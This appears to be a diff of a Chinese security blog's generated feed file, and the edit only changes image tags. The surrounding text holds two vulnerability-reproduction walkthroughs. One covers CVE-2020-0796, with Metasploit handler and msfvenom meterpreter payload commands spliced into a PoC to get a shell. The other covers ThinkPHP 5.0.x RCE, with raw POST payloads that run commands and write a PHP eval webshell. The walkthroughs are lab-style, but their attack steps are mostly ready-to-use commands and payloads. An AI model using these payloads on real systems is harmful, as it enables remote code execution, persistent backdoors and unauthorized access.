@@ -52,23 +52,23 @@
 <hr>
 <h2 id="三、漏洞复现："><a href="#三、漏洞复现：" class="headerlink" title="三、漏洞复现："></a>三、漏洞复现：</h2><p>1、先对使用kali对 9999 端口进行监听：</p>
 <figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">msfconsole</span><br><span class="line">use exploit&#x2F;multi&#x2F;handler</span><br><span class="line">set payload windows&#x2F;x64&#x2F;meterpreter&#x2F;bind_tcp</span><br><span class="line">set lport 9999</span><br><span class="line">set rhost 192.168.201.132</span><br><span class="line">run</span><br></pre></td></tr></table></figure>
-<p>![](Windows：CVE-2020-0796 RCE/1.png)</p>
+<p><img src="/2021/02/10/Windows/Windows%EF%BC%9ACVE-2020-0796%20RCE/1.png"></p>
 <p>2、kali 使用 msf 生成木马（此处端口需跟监听的端口是一致的）</p>
 <figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">msfvenom -p windows&#x2F;x64&#x2F;meterpreter&#x2F;bind_tcp LPORT&#x3D;9999 -b &#39;\x00&#39; -i 1 -f python&gt;test.py</span><br></pre></td></tr></table></figure>
-<p>木马生成后的内容为：<br>![](Windows：CVE-2020-0796 RCE/2.png)</p>
-<p>下载好的 POC：<br>![](Windows：CVE-2020-0796 RCE/3.png)</p>
+<p>木马生成后的内容为：<br><img src="/2021/02/10/Windows/Windows%EF%BC%9ACVE-2020-0796%20RCE/2.png"></p>
+<p>下载好的 POC：<br><img src="/2021/02/10/Windows/Windows%EF%BC%9ACVE-2020-0796%20RCE/3.png"></p>
 <p>3、先把木马的内的 buf 替换为 USER_PAYLOAD ，再替换 exploit.py 内的 USER_PAYLOAD 行的内容</p>
 <ul>
 <li>:set nu       &emsp;&emsp;// 显示行</li>
 <li>:91,127s/buf/USER_PAYLOAD    &emsp;&emsp;// 把91-127行的 buf 替换为 USER_PAYLOAD</li>
 </ul>
-<p>![](Windows：CVE-2020-0796 RCE/4.png)</p>
-<p>4、使用 Python3 运行（在此处需按一次回车）<br>![](Windows：CVE-2020-0796 RCE/5.png)<br>![](Windows：CVE-2020-0796 RCE/6.png)</p>
+<p><img src="/2021/02/10/Windows/Windows%EF%BC%9ACVE-2020-0796%20RCE/4.png"></p>
+<p>4、使用 Python3 运行（在此处需按一次回车）<br><img src="/2021/02/10/Windows/Windows%EF%BC%9ACVE-2020-0796%20RCE/5.png"><br>![](Windows：CVE-2020-0796 RCE/6.png)</p>
 <p>5、此时监听的 9999 端口已收到访反弹的 shell</p>
 <ul>
 <li>// 如未收到反弹的 Shell 则使用 Python 重新运行一次 POC</li>
 </ul>
-<p>![](Windows：CVE-2020-0796 RCE/7.png)<br>![](Windows：CVE-2020-0796 RCE/8.png)</p>
+<p><img src="/2021/02/10/Windows/Windows%EF%BC%9ACVE-2020-0796%20RCE/7.png"><br>![](Windows：CVE-2020-0796 RCE/8.png)</p>
 <hr>
 ]]></content>
       <categories>
@@ -85,10 +85,10 @@
     <content><![CDATA[<h2 id="0x00-简介"><a href="#0x00-简介" class="headerlink" title="0x00  简介"></a>0x00  简介</h2><p>ThinkPHP是为了简化企业级应用开发和敏捷WEB应用开发而诞生的。最早诞生于2006年初，2007年元旦正式更名为ThinkPHP，并且遵循Apache2开源协议发布。ThinkPHP从诞生以来一直秉承简洁实用的设计原则，在保持出色的性能和至简的代码的同时，也注重易用性。并且拥有众多原创功能和特性，在社区团队的积极参与下，在易用性、扩展性和性能方面不断优化和改进。</p>
 <h2 id="0x01-漏洞概述"><a href="#0x01-漏洞概述" class="headerlink" title="0x01  漏洞概述"></a>0x01  漏洞概述</h2><p>由于没有正确处理控制器名，导致在网站没有开启强制路由的情况下（即默认情况下）可以执行任意方法，从而导致远程命令执行漏洞。</p>
 <h2 id="0x02-影响版本"><a href="#0x02-影响版本" class="headerlink" title="0x02  影响版本"></a>0x02  影响版本</h2><p>ThinkPHP5 5.0.2 - 5.0.23</p>
-<h2 id="0x03-环境搭建"><a href="#0x03-环境搭建" class="headerlink" title="0x03  环境搭建"></a>0x03  环境搭建</h2><p>测试环境：ThinkPHP_5.0.22<br><a href="http://www.thinkphp.cn/donate/download/id/1260.html?__cf_chl_jschl_tk__=2d60761f086ace0ca0fd80f8d46b2043d9f844b1-1610970960-0-AbyMemrR-Tnnk2tMvVITwZ3AfrjPWPkp95Xb244JjneXgQGhmYKbSlTPo__l-jK-KVZCyUzkUwhTTZPmKCWbxc7roIfajMxDDZkxqPluw3D18svMPwAYOehIzV_I1hdnzg558pTFF7INimMKDhcNvwTak7VzuegJKyCY20EVc2PFvGWTLvdyXj-w2xDnNTdTldLg3Wenmsw_B6oZpC2aUUVnKJwJy1Z0JXoVeaRTmDlMZhB7knKynX0AgVCMI34Qhqb-k-A28mOzO8UpBKGv6y3ANxQPXEI3Gg0_nKO81VsWrrBZeqwjGPJEPu5pNnW6sukhE-l4RfZs_E3yrq3lmQU">ThinkPHP_5.0.22下载</a><br>下载完后解压到 phpstudy 的 www 文件夹内<br>访问 <a href="http://127.0.0.1/thinkphp/public/">http://127.0.0.1/thinkphp/public/</a> 可看到页面<br>![](ThinkPHP5 5.0.23/1.jpg)</p>
+<h2 id="0x03-环境搭建"><a href="#0x03-环境搭建" class="headerlink" title="0x03  环境搭建"></a>0x03  环境搭建</h2><p>测试环境：ThinkPHP_5.0.22<br><a href="http://www.thinkphp.cn/donate/download/id/1260.html?__cf_chl_jschl_tk__=2d60761f086ace0ca0fd80f8d46b2043d9f844b1-1610970960-0-AbyMemrR-Tnnk2tMvVITwZ3AfrjPWPkp95Xb244JjneXgQGhmYKbSlTPo__l-jK-KVZCyUzkUwhTTZPmKCWbxc7roIfajMxDDZkxqPluw3D18svMPwAYOehIzV_I1hdnzg558pTFF7INimMKDhcNvwTak7VzuegJKyCY20EVc2PFvGWTLvdyXj-w2xDnNTdTldLg3Wenmsw_B6oZpC2aUUVnKJwJy1Z0JXoVeaRTmDlMZhB7knKynX0AgVCMI34Qhqb-k-A28mOzO8UpBKGv6y3ANxQPXEI3Gg0_nKO81VsWrrBZeqwjGPJEPu5pNnW6sukhE-l4RfZs_E3yrq3lmQU">ThinkPHP_5.0.22下载</a><br>下载完后解压到 phpstudy 的 www 文件夹内<br>访问 <a href="http://127.0.0.1/thinkphp/public/">http://127.0.0.1/thinkphp/public/</a> 可看到页面<br><img src="/2021/02/10/ThinkPHP/ThinkPHP%205.0.2-5.0.23/ThinkPHP5%205.0.23/1.jpg"></p>
 <h2 id="0x04-漏洞利用"><a href="#0x04-漏洞利用" class="headerlink" title="0x04  漏洞利用"></a>0x04  漏洞利用</h2><p>1、访问 <a href="http://127.0.0.1/thinkphp/public/index.php?s=captcha">http://127.0.0.1/thinkphp/public/index.php?s=captcha</a> 并抓包</p>
-<p>2、构建 POC 并发包<br>![](ThinkPHP5 5.0.23/2.png)</p>
-<p>3、使用蚁剑连接<br>![](ThinkPHP5 5.0.23/3.png)</p>
+<p>2、构建 POC 并发包<br><img src="/2021/02/10/ThinkPHP/ThinkPHP%205.0.2-5.0.23/ThinkPHP5%205.0.23/2.png"></p>
+<p>3、使用蚁剑连接<br><img src="/2021/02/10/ThinkPHP/ThinkPHP%205.0.2-5.0.23/ThinkPHP5%205.0.23/3.png"></p>
 <p>POC：<br>通过发包</p>
 <figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">POST &#x2F;thinkphp&#x2F;public&#x2F;index.php?s&#x3D;captcha HTTP&#x2F;1.1</span><br><span class="line"></span><br><span class="line">#  查看当前用户</span><br><span class="line">_method&#x3D;__construct&amp;filter[]&#x3D;system&amp;method&#x3D;get&amp;get[]&#x3D;whoami</span><br><span class="line"></span><br><span class="line">#  写入 WebShell（Linux）</span><br><span class="line">_method&#x3D;__construct&amp;filter[]&#x3D;system&amp;method&#x3D;get&amp;server[REQUEST_METHOD]&#x3D;echo &quot;&lt;?php @eval(\$_POST[&#39;pass&#39;]);?&gt;&quot; &gt; 1.php</span><br><span class="line"></span><br><span class="line">#  写入 WebShell（Windows）</span><br><span class="line">_method&#x3D;__construct&amp;filter[]&#x3D;system&amp;method&#x3D;get&amp;server[REQUEST_METHOD]&#x3D;echo ^&lt;?php @eval($_POST[&#39;pass&#39;]);?^&gt; &gt; 1.php</span><br></pre></td></tr></table></figure>
 <p>通过 URL</p>
